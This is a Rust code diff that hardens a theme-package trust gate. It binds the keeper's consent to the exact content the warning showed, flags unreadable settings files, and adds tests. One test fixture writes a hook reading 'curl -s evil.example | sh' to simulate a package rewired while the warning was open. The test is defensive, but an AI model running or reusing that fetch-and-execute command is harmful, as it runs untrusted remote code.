@@ -48,6 +48,13 @@
 
 use std::path::{Path, PathBuf};
 
+/// The `key` of a CONSERVATIVE report entry: a `settings.toml` that does not
+/// parse, or that the reader refused, appears as one entry with this key
+/// instead of an empty list. It names a TABLE, never an event that runs, and
+/// it is the single marker that tells a consumer this report is INCOMPLETE —
+/// what it describes is a file nobody read.
+pub const UNINSPECTED_HOOK_KEY: &str = "hooks table";
+
 /// One shell hook a provider's `settings.toml` declares.
 #[derive(Debug, Clone, PartialEq, Eq)]
 pub struct ShellHook {
@@ -125,6 +132,21 @@ impl ThemeTrustReport {
     /// a theme applies exactly as it did before this detector existed.
     pub fn is_empty(&self) -> bool {
         self.shell_hooks.is_empty() && self.lua_presets.is_empty()
+    }
+
+    /// Whether any part of the package could NOT be inspected — the report
+    /// then carries a CONSERVATIVE entry ([`UNINSPECTED_HOOK_KEY`]) instead
+    /// of the truth about a file nobody read.
+    ///
+    /// Consumers must treat such a report as strictly weaker than a full
+    /// one. The gate itself only needs "non-empty" (it warns either way),
+    /// but nothing may REMEMBER it: a package HVE could not read can change
+    /// inside without the report changing, so a remembered acceptance of it
+    /// would silence a warning over content nobody ever judged (W2c, S1).
+    pub fn is_uninspected(&self) -> bool {
+        self.shell_hooks
+            .iter()
+            .any(|h| h.key == UNINSPECTED_HOOK_KEY)
     }
 }
 
@@ -300,7 +322,7 @@ fn hooks_in_settings(text: &str, provider: &str, file: &Path) -> Vec<ShellHook> 
 fn push_unparsed_hooks(provider: &str, file: &Path) -> ShellHook {
     ShellHook {
         provider: provider.to_string(),
-        key: "hooks table".to_string(),
+        key: UNINSPECTED_HOOK_KEY.to_string(),
         command: format!(
             "the hooks table in {} could not be read by this scan: \
              the file does not parse as TOML; it may carry shell commands that are not listed here",
@@ -335,7 +357,7 @@ fn push_uninspectable_hooks(
 ) -> ShellHook {
     ShellHook {
         provider: provider.to_string(),
-        key: "hooks table".to_string(),
+        key: UNINSPECTED_HOOK_KEY.to_string(),
         command: format!(
             "the settings file {} could not be inspected by this scan: {}; \
              it may carry shell commands that are not listed here",
@@ -414,6 +436,20 @@ fn is_reported_preset(category: &str, name: &str) -> bool {
 // disk at that moment. Contract: a theme that carries neither hooks nor
 // Lua presets never reaches `Hold` — it applies exactly as it did
 // before this module existed.
+//
+// W2c — the remembered acceptance. Consent is no longer only one-shot:
+// the caller keeps a persistent store of what the keeper has already
+// accepted (one entry per theme, keyed by the EXACT content of this
+// report) and passes that answer in as `already_accepted`, so the gate
+// itself never learns where consent is kept. Two rules follow, and both
+// fail towards the warning:
+//
+// - A stored acceptance is consulted ONLY for a non-empty report, so a
+//   clean theme's path never depends on the store.
+// - The armed confirmation carries the report the warning SHOWED, and
+//   proceeds only when the fresh report is identical to it. A package
+//   rewired while the modal was up is therefore judged again from
+//   scratch instead of applying on consent given to other content.
 
 /// Which apply path an attempt came from (W2 gates both entry points).
 #[derive(Debug, Clone, Copy, PartialEq, Eq)]
@@ -433,6 +469,11 @@ pub struct PendingApply {
     pub index: i32,
     /// Which entry point must be re-invoked to apply after confirmation.
     pub origin: ApplyOrigin,
+    /// The report the warning is SHOWING for this attempt (W2c, spec S4).
+    /// Kept so the confirmation can be checked against the FRESH report on
+    /// re-entry: a package rewired while the modal was up must warn again
+    /// instead of applying on consent the keeper gave to other content.
+    pub report: ThemeTrustReport,
 }
 
 /// What the caller must do with one apply attempt.
@@ -452,9 +493,11 @@ pub enum GateDecision {
 pub struct TrustGate {
     /// The attempt the warning is currently asking about.
     pending: Option<PendingApply>,
-    /// The name the keeper confirmed, consumed by the next matching
+    /// The attempt the keeper confirmed, consumed by the next matching
     /// [`TrustGate::request`] and cleared by [`TrustGate::finish_confirm`].
-    confirmed: Option<String>,
+    /// It carries the report the warning SHOWED, not just the name: the
+    /// confirmation is consent for that content, never for a name (W2c, S4).
+    confirmed: Option<PendingApply>,
 }
 
 impl TrustGate {
@@ -478,46 +521,62 @@ impl TrustGate {
 
     /// The name confirmed but not yet re-entered, for diagnostics.
     pub fn confirmed(&self) -> Option<&str> {
-        self.confirmed.as_deref()
+        self.confirmed.as_ref().map(|a| a.name.as_str())
     }
 
     /// Consult the gate for ONE apply attempt.
     ///
-    /// Order matters and is pinned by test: the modal check wins (nothing
-    /// applies behind an open warning), then the one-shot confirmation,
-    /// then the report — an empty report is the pre-W2 behaviour and is
-    /// never held.
+    /// `already_accepted` says whether the keeper has ALREADY accepted
+    /// EXACTLY this content (the caller reads the persistent store, so the
+    /// gate stays free of I/O and of any knowledge of where consent is
+    /// kept). Order matters and is pinned by test: the modal check wins
+    /// (nothing applies behind an open warning), then an armed
+    /// confirmation, then an empty report (the pre-W2 behaviour, which
+    /// `already_accepted` can never change), then a stored acceptance.
     pub fn request(
         &mut self,
         name: &str,
         index: i32,
         origin: ApplyOrigin,
         report: &ThemeTrustReport,
+        already_accepted: bool,
     ) -> GateDecision {
         if self.pending.is_some() {
             return GateDecision::Blocked;
         }
-        if self.confirmed.as_deref() == Some(name) {
-            self.confirmed = None;
-            return GateDecision::Proceed;
+        // The armed token is spent on THIS attempt, whatever the outcome:
+        // `take` makes it one-shot, so it can never be replayed — and a
+        // package rewired while the warning was up fails the comparison
+        // below and is judged again from scratch, which is the safe
+        // direction (a stale arm costs one more warning, never an apply).
+        if let Some(armed) = self.confirmed.take() {
+            if armed.name == name && armed.report == *report {
+                return GateDecision::Proceed;
+            }
         }
         if report.is_empty() {
+            return GateDecision::Proceed;
+        }
+        if already_accepted {
             return GateDecision::Proceed;
         }
         self.pending = Some(PendingApply {
             name: name.to_string(),
             index,
             origin,
+            report: report.clone(),
         });
         GateDecision::Hold
     }
 
     /// The keeper pressed Continue: take the pending attempt and arm the
-    /// one-shot confirmation for its name. The caller re-invokes the SAME
-    /// entry point, whose `request` then returns [`GateDecision::Proceed`].
+    /// one-shot confirmation for its name AND its content. The caller
+    /// re-invokes the SAME entry point, whose `request` then returns
+    /// [`GateDecision::Proceed`] if the package still carries what the
+    /// warning showed.
     pub fn begin_confirm(&mut self) -> Option<PendingApply> {
         let pending = self.pending.take()?;
-        self.confirmed = Some(pending.name.clone());
+        self.confirmed = Some(pending.clone());
         Some(pending)
     }
 
@@ -1219,7 +1278,7 @@ mod tests {
         // `{key} — {command}` built from this very entry.
         let mut gate = TrustGate::new();
         assert_eq!(
-            gate.request("Theme", 0, ApplyOrigin::Gallery, &report),
+            gate.request("Theme", 0, ApplyOrigin::Gallery, &report, false),
             GateDecision::Hold,
             "a multi-line inline hook must hold the apply behind the warning"
         );
@@ -1714,7 +1773,7 @@ mod tests {
         let mut gate = TrustGate::new();
 
         assert_eq!(
-            gate.request("Risky", 3, ApplyOrigin::Gallery, &report),
+            gate.request("Risky", 3, ApplyOrigin::Gallery, &report, false),
             GateDecision::Hold,
             "a theme carrying a shell hook must be held, not applied"
         );
@@ -1725,12 +1784,13 @@ mod tests {
                 name: "Risky".into(),
                 index: 3,
                 origin: ApplyOrigin::Gallery,
+                report: report.clone(),
             }),
             "the gate must remember what to apply and which path asked"
         );
         // A second attempt while the warning is open changes nothing.
         assert_eq!(
-            gate.request("Risky", 3, ApplyOrigin::Gallery, &report),
+            gate.request("Risky", 3, ApplyOrigin::Gallery, &report, false),
             GateDecision::Blocked
         );
 
@@ -1740,7 +1800,7 @@ mod tests {
         assert_eq!(pending.name, "Risky");
         assert_eq!(pending.origin, ApplyOrigin::Gallery);
         assert_eq!(
-            gate.request("Risky", 3, ApplyOrigin::Gallery, &report),
+            gate.request("Risky", 3, ApplyOrigin::Gallery, &report, false),
             GateDecision::Proceed,
             "the confirmed re-entry must apply exactly as before"
         );
@@ -1748,12 +1808,13 @@ mod tests {
         assert!(!gate.is_open(), "confirming must close the warning");
         assert_eq!(gate.confirmed(), None, "the confirmation is one-shot");
 
-        // Consent is not remembered forever: applying that theme again
-        // warns again.
+        // The gate itself remembers nothing across attempts: without a
+        // stored acceptance the same theme warns again. Turning that into a
+        // silent apply is the caller's `already_accepted` input (W2c).
         assert_eq!(
-            gate.request("Risky", 3, ApplyOrigin::Gallery, &report),
+            gate.request("Risky", 3, ApplyOrigin::Gallery, &report, false),
             GateDecision::Hold,
-            "a second apply of the same risky theme must warn again"
+            "without a stored acceptance the same risky theme must warn again"
         );
     }
 
@@ -1766,7 +1827,7 @@ mod tests {
         let mut gate = TrustGate::new();
 
         assert_eq!(
-            gate.request("Risky", 0, ApplyOrigin::Panel, &report),
+            gate.request("Risky", 0, ApplyOrigin::Panel, &report, false),
             GateDecision::Hold
         );
         assert!(gate.cancel(), "declining a held attempt reports it");
@@ -1782,7 +1843,7 @@ mod tests {
             "cancel with nothing pending is a no-op (idempotent)"
         );
         assert_eq!(
-            gate.request("Risky", 0, ApplyOrigin::Panel, &report),
+            gate.request("Risky", 0, ApplyOrigin::Panel, &report, false),
             GateDecision::Hold,
             "after declining, applying the same theme must warn again"
         );
@@ -1799,14 +1860,14 @@ mod tests {
         let mut gate = TrustGate::new();
 
         assert_eq!(
-            gate.request("Plain", 1, ApplyOrigin::Gallery, &report),
+            gate.request("Plain", 1, ApplyOrigin::Gallery, &report, false),
             GateDecision::Proceed,
             "the pre-W2 behaviour must be untouched for a clean theme"
         );
         assert!(!gate.is_open());
         assert_eq!(gate.pending(), None);
         assert_eq!(
-            gate.request("Plain", 1, ApplyOrigin::Panel, &report),
+            gate.request("Plain", 1, ApplyOrigin::Panel, &report, false),
             GateDecision::Proceed,
             "the second path must be gated by the same rule"
         );
@@ -1823,16 +1884,16 @@ mod tests {
         let mut gate = TrustGate::new();
 
         assert_eq!(
-            gate.request("Risky", 0, ApplyOrigin::Gallery, &risky),
+            gate.request("Risky", 0, ApplyOrigin::Gallery, &risky, false),
             GateDecision::Hold
         );
         assert_eq!(
-            gate.request("Plain", 1, ApplyOrigin::Gallery, &clean),
+            gate.request("Plain", 1, ApplyOrigin::Gallery, &clean, false),
             GateDecision::Blocked,
             "nothing may apply behind the open warning"
         );
         assert_eq!(
-            gate.request("Other", 2, ApplyOrigin::Panel, &risky),
+            gate.request("Other", 2, ApplyOrigin::Panel, &risky, false),
             GateDecision::Blocked
         );
         assert_eq!(
@@ -1852,7 +1913,7 @@ mod tests {
         let mut gate = TrustGate::new();
 
         assert_eq!(
-            gate.request("Risky", 5, ApplyOrigin::Gallery, &report),
+            gate.request("Risky", 5, ApplyOrigin::Gallery, &report, false),
             GateDecision::Hold
         );
         let pending = gate.begin_confirm().expect("held attempt");
@@ -1861,10 +1922,117 @@ mod tests {
         gate.finish_confirm();
         assert!(!gate.is_open());
         assert_eq!(
-            gate.request("Risky", 5, ApplyOrigin::Gallery, &report),
+            gate.request("Risky", 5, ApplyOrigin::Gallery, &report, false),
             GateDecision::Hold,
             "an unspent confirmation must not silently apply the theme"
         );
+    }
+
+    /// W2c spec S4, and the fix of W2's first MEDIUM: the confirmation
+    /// authorises the content the warning SHOWED, never the theme's name.
+    /// The re-entry re-reads the package, so a package REWIRED while the
+    /// modal was up must warn again instead of applying on the old consent.
+    #[test]
+    fn an_armed_confirmation_of_changed_content_warns_again() {
+        let tmp = tempfile::tempdir().unwrap();
+        let theme = risky_theme(tmp.path());
+        let mut gate = TrustGate::new();
+
+        let shown = inspect_theme_package(&theme);
+        assert_eq!(
+            gate.request("Risky", 0, ApplyOrigin::Gallery, &shown, false),
+            GateDecision::Hold
+        );
+        let pending = gate.begin_confirm().expect("held attempt");
+        assert_eq!(pending.name, "Risky");
+
+        // The keeper pressed Continue; while the modal was up the package
+        // was rewired to a DIFFERENT command.
+        write_settings(&theme, "[hooks]\nstarted = \"curl -s evil.example | sh\"\n");
+        let fresh = inspect_theme_package(&theme);
+        assert_ne!(
+            fresh, shown,
+            "the rewrite must be visible to the detector for this test to mean anything"
+        );
+
+        assert_eq!(
+            gate.request("Risky", 0, ApplyOrigin::Gallery, &fresh, false),
+            GateDecision::Hold,
+            "a package rewired after the confirmation must warn again, not apply on the old consent"
+        );
+        assert!(gate.is_open(), "the fresh warning must be the open one");
+        assert_eq!(
+            gate.pending().map(|p| p.report.clone()),
+            Some(fresh),
+            "the warning must show the FRESH content, not the content the keeper accepted"
+        );
+    }
+
+    /// W2c spec S4, second half: the same content that was SHOWN still
+    /// applies on the armed re-entry (the ordinary confirmation), and the
+    /// armed token is one-shot — it never authorises a later attempt.
+    #[test]
+    fn an_armed_confirmation_of_identical_content_applies_once() {
+        let tmp = tempfile::tempdir().unwrap();
+        let report = inspect_theme_package(&risky_theme(tmp.path()));
+        let mut gate = TrustGate::new();
+
+        assert_eq!(
+            gate.request("Risky", 1, ApplyOrigin::Panel, &report, false),
+            GateDecision::Hold
+        );
+        let pending = gate.begin_confirm().expect("held attempt");
+        assert_eq!(pending.origin, ApplyOrigin::Panel);
+        assert_eq!(
+            gate.request("Risky", 1, ApplyOrigin::Panel, &report, false),
+            GateDecision::Proceed,
+            "the confirmed content must apply"
+        );
+        gate.finish_confirm();
+        assert_eq!(
+            gate.request("Risky", 1, ApplyOrigin::Panel, &report, false),
+            GateDecision::Hold,
+            "the confirmation is one-shot: the next attempt warns again"
+        );
+    }
+
+    /// W2c spec S1/S2: an acceptance the keeper already gave for EXACTLY
+    /// this content applies with no warning — the warning is only for
+    /// content nobody has judged yet. W2 failing test.
+    #[test]
+    fn an_already_accepted_content_applies_without_a_warning() {
+        let tmp = tempfile::tempdir().unwrap();
+        let report = inspect_theme_package(&risky_theme(tmp.path()));
+        let mut gate = TrustGate::new();
+
+        assert_eq!(
+            gate.request("Risky", 2, ApplyOrigin::Gallery, &report, true),
+            GateDecision::Proceed,
+            "content the keeper already accepted must apply with no warning"
+        );
+        assert!(!gate.is_open(), "no warning is owed for accepted content");
+        assert_eq!(
+            gate.request("Risky", 2, ApplyOrigin::Gallery, &report, false),
+            GateDecision::Hold,
+            "without that acceptance the same content is held again"
+        );
+    }
+
+    /// W2c spec S5: an acceptance is NEVER consulted for a package that
+    /// carries nothing — a clean theme's behaviour does not depend on the
+    /// store at all, so a stale acceptance can never mask a clean apply.
+    #[test]
+    fn a_clean_package_ignores_any_stored_acceptance() {
+        let tmp = tempfile::tempdir().unwrap();
+        let report = inspect_theme_package(&clean_theme(tmp.path()));
+        let mut gate = TrustGate::new();
+
+        assert_eq!(
+            gate.request("Plain", 0, ApplyOrigin::Gallery, &report, true),
+            GateDecision::Proceed,
+            "a clean package applies, and its path does not depend on the store"
+        );
+        assert!(report.is_empty(), "the fixture must carry neither hooks nor presets");
     }
 
     // ── W10b: the theme's settings.toml is an UNTRUSTED file ───────────
